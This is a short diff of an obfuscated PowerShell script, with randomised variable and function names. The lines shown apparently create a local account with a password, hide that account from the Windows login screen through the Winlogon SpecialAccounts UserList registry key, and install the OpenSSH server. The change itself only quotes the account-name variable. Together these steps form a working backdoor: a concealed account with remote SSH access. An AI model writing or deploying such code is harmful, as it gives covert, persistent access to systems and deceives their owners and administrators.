@@ -30,7 +30,7 @@ $CBFXIYeWPR = (ConvertTo-SecureString $DCilJFugpP -AsPlainText -Force)
 geIwCZloBx -sqbXFdLvyw $sqbXFdLvyw -CBFXIYeWPR $CBFXIYeWPR
 
 # registry
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name $sqbXFdLvyw -Value 0 -Type DWORD -Force
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name "$sqbXFdLvyw" -Value 0 -Type DWORD -Force
 
 # ssh
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
